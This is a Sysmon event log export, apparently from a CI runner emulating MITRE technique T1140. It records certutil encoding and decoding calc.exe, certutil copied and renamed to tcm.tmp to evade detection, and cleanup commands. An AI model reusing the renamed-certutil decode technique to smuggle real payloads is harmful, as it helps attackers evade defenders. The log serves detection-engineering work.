ParentCommandLine: ""cmd.exe"" /c copy %windir%\system32\certutil.exe %temp%\tcm.tmp & %temp%\tcm.tmp -encode C:\Windows\System32\calc.exe %temp%\T1140_calc2.txt & %temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:34 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:34.141
ProcessGuid: {f995aebf-6796-6942-c607-000000000e00}
ProcessId: 2460
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c copy %%windir%%\system32\certutil.exe %%temp%%\tcm.tmp & %%temp%%\tcm.tmp -encode C:\Windows\System32\calc.exe %%temp%%\T1140_calc2.txt & %%temp%%\tcm.tmp -decode %%temp%%\T1140_calc2.txt %%temp%%\T1140_calc2_decoded.exe
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:33 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:33.866
ProcessGuid: {f995aebf-6795-6942-c507-000000000e00}
ProcessId: 3796
Image: C:\Windows\system32\certutil.exe
TargetFilename: C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc_decoded.exe
CreationUtcTime: 2025-12-17 08:19:33.866
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:33 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:33.823
ProcessGuid: {f995aebf-6795-6942-c507-000000000e00}
ProcessId: 3796
Image: C:\Windows\System32\certutil.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
CommandLine: certutil  -decode C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc.txt C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc_decoded.exe
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
ParentProcessGuid: {f995aebf-6795-6942-c207-000000000e00}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c certutil -encode C:\Windows\System32\calc.exe %temp%\T1140_calc.txt & certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:33 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:33.755
ProcessGuid: {f995aebf-6795-6942-c407-000000000e00}
ProcessId: 7768
Image: C:\Windows\System32\certutil.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: CertUtil.exe
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
CommandLine: certutil  -encode C:\Windows\System32\calc.exe C:\Users\RUNNER~1\AppData\Local\Temp\T1140_calc.txt 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=52749F37FF21AF7FA72C2F6256DF11740BB88B61EB5B6BF946D37A44A201435F
ParentProcessGuid: {f995aebf-6795-6942-c207-000000000e00}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c certutil -encode C:\Windows\System32\calc.exe %temp%\T1140_calc.txt & certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:33 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:33.720
ProcessGuid: {f995aebf-6795-6942-c207-000000000e00}
ProcessId: 9196
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c certutil -encode C:\Windows\System32\calc.exe %%temp%%\T1140_calc.txt & certutil -decode %%temp%%\T1140_calc.txt %%temp%%\T1140_calc_decoded.exe
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:33 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:33.354
ProcessGuid: {f995aebf-6795-6942-c107-000000000e00}
ProcessId: 9132
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:30 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:19:30.230
SourceProcessGUID: {f995aebf-6771-6942-6807-000000000e00}
SourceProcessId: 9256
SourceThreadId: 1736
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+f51a|C:\Windows\SYSTEM32\framedynos.dll+ead5|C:\Windows\system32\wbem\wmiprvse.exe+2b00f|C:\Windows\system32\wbem\wmiprvse.exe+2a25f|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:19:30 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:30.169
ProcessGuid: {f995aebf-6792-6942-bd07-000000000e00}
ProcessId: 10048
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c taskkill /f /im calculator.exe >nul 2>nul
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:29 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:29.653
ProcessGuid: {f995aebf-6791-6942-bb07-000000000e00}
ProcessId: 6060
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_izc0s0vx.ndj.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:29 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:29.631
ProcessGuid: {f995aebf-6791-6942-bb07-000000000e00}
ProcessId: 6060
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_izc0s0vx.ndj.ps1
CreationUtcTime: 2025-12-17 08:19:29.631
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:29 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:29.541
ProcessGuid: {f995aebf-6791-6942-bb07-000000000e00}
ProcessId: 6060
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$fileNameToDelete = '04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog'; $filePathToDelete = \""""$env:windir\registration\\""""; $fullPathToDelete = Join-Path $filePathToDelete $fileNameToDelete; if (Test-Path $fullPathToDelete) { Remove-Item -Path $fullPathToDelete -Force; Write-Host \""""File deleted: $fullPathToDelete\"""" } else { Write-Host \""""File not found: $fullPathToDelete\"""" }}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:29 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:29.240
ProcessGuid: {f995aebf-6791-6942-b907-000000000e00}
ProcessId: 2572
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_udf5mgoz.2bh.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:29 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:29.219
ProcessGuid: {f995aebf-6791-6942-b907-000000000e00}
ProcessId: 2572
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_udf5mgoz.2bh.ps1
CreationUtcTime: 2025-12-17 08:19:29.219
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:29 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:29.130
ProcessGuid: {f995aebf-6791-6942-b907-000000000e00}
ProcessId: 2572
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:28 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:28.829
ProcessGuid: {f995aebf-6790-6942-b707-000000000e00}
ProcessId: 8540
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_15qro3gt.hfo.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:28 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:28.808
ProcessGuid: {f995aebf-6790-6942-b707-000000000e00}
ProcessId: 8540
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_15qro3gt.hfo.ps1
CreationUtcTime: 2025-12-17 08:19:28.808
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:28 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:28.716
ProcessGuid: {f995aebf-6790-6942-b707-000000000e00}
ProcessId: 8540
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:28 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:28.429
ProcessGuid: {f995aebf-6790-6942-b507-000000000e00}
ProcessId: 5204
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_f3z2oqag.zzh.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:28 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:28.407
ProcessGuid: {f995aebf-6790-6942-b507-000000000e00}
ProcessId: 5204
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_f3z2oqag.zzh.ps1
CreationUtcTime: 2025-12-17 08:19:28.407
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:28 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:28.317
ProcessGuid: {f995aebf-6790-6942-b507-000000000e00}
ProcessId: 5204
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:28 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:19:28.097
SourceProcessGUID: {f995aebf-6771-6942-6807-000000000e00}
SourceProcessId: 9256
SourceThreadId: 1736
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+f51a|C:\Windows\SYSTEM32\framedynos.dll+ead5|C:\Windows\system32\wbem\wmiprvse.exe+2b00f|C:\Windows\system32\wbem\wmiprvse.exe+2a25f|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:19:28 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:19:28.028
SourceProcessGUID: {f995aebf-6771-6942-6807-000000000e00}
SourceProcessId: 9256
SourceThreadId: 1736
SourceImage: C:\Windows\system32\wbem\wmiprvse.exe
TargetProcessGUID: {f995aebf-5ac6-6942-0d00-000000000e00}
TargetProcessId: 996
TargetImage: C:\Windows\system32\lsass.exe
GrantedAccess: 0x1410
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+162184|C:\Windows\System32\KERNELBASE.dll+3fba6|C:\Windows\system32\wbem\cimwin32.dll+11d96|C:\Windows\system32\wbem\cimwin32.dll+115cd|C:\Windows\SYSTEM32\framedynos.dll+f51a|C:\Windows\SYSTEM32\framedynos.dll+ead5|C:\Windows\system32\wbem\wmiprvse.exe+2b00f|C:\Windows\system32\wbem\wmiprvse.exe+2a25f|C:\Windows\System32\RPCRT4.dll+d3663|C:\Windows\System32\RPCRT4.dll+174bd|C:\Windows\System32\combase.dll+9ac7f|C:\Windows\System32\RPCRT4.dll+6cd16|C:\Windows\System32\combase.dll+9ab62|C:\Windows\System32\combase.dll+9a0d6|C:\Windows\System32\combase.dll+99721|C:\Windows\System32\combase.dll+1095d6|C:\Windows\System32\combase.dll+6f51a|C:\Windows\System32\combase.dll+74988|C:\Windows\System32\combase.dll+a40d3|C:\Windows\System32\RPCRT4.dll+880f7|C:\Windows\System32\RPCRT4.dll+51ab4|C:\Windows\System32\RPCRT4.dll+5287a|C:\Windows\System32\RPCRT4.dll+3fc54|C:\Windows\System32\RPCRT4.dll+5001c
SourceUser: NT AUTHORITY\NETWORK SERVICE
TargetUser: NT AUTHORITY\SYSTEM"
"12/17/2025 8:19:27 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:27.966
ProcessGuid: {f995aebf-678f-6942-b107-000000000e00}
ProcessId: 8512
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c taskkill /f /im calculator.exe >nul 2>nul & taskkill /f /im CalculatorApp.exe >nul 2>nul
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:27 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:19:27.572
ProcessGuid: {f995aebf-678f-6942-af07-000000000e00}
ProcessId: 7704
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yx0ggvnl.bc1.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:19:27 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:19:27.550
ProcessGuid: {f995aebf-678f-6942-af07-000000000e00}
ProcessId: 7704
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_yx0ggvnl.bc1.ps1
CreationUtcTime: 2025-12-17 08:19:27.550
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:19:27 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:19:27.465
ProcessGuid: {f995aebf-678f-6942-af07-000000000e00}
ProcessId: 7704
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Remove-ItemProperty -Force -ErrorAction Ignore -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name Debug}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
